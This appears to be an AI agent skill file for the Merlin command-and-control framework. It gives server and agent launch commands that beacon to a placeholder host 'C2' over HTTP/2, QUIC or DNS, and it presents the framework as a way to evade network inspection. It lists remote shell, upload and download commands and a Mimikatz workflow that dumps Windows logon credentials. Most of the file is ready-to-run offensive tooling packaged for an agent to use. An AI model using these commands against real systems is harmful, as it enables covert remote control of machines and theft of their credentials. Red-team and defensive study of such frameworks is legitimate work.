---
name: merlin
description: "Cross-platform C2 server using HTTP/2 (h2c), HTTP/3 (QUIC), and DNS transports for covert agent communication. Use when needing a Go-based implant over non-standard encrypted channels to evade network inspection."
license: MIT
compatibility: "Go; Linux/macOS/Windows; github.com/Ne0nd0g/merlin"
metadata:
  author: AeonDave
  version: "1.0"
---

# Merlin

Cross-platform C2 using HTTP/2 and HTTP/3 (QUIC) — Go server + multi-OS agent.

## Quick Start

```bash
# Download from https://github.com/Ne0nd0g/merlin/releases

# Start server (HTTPS/HTTP2 on 443)
./merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -x509cert server.crt -x509key server.key

# Generate agent
./merlinAgent-Linux-x64 -url https://C2:443/ -psk "passphrase"
```

## Server Commands

| Command | Purpose |
|---------|---------|
| `sessions` | List connected agents |
| `interact <UUID>` | Enter agent session |
| `use module <path>` | Load a module |
| `upload <src> <dst>` | Upload file to agent |
| `download <src>` | Download from agent |
| `shell <cmd>` | Run OS command |
| `exit` | Terminate agent |

## Common Workflows

**HTTP/3 QUIC listener:**
```bash
./merlinServer-Linux-x64 -proto h3 -i 0.0.0.0 -p 8443
./merlinAgent-Windows-x64.exe -url https://C2:8443/ -proto h3 -psk "passphrase"
```

**Mimikatz via Merlin module:**
```
interact <UUID>
use module windows/credentials/mimikatz/logonpasswords
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Transport options and agent build flags |
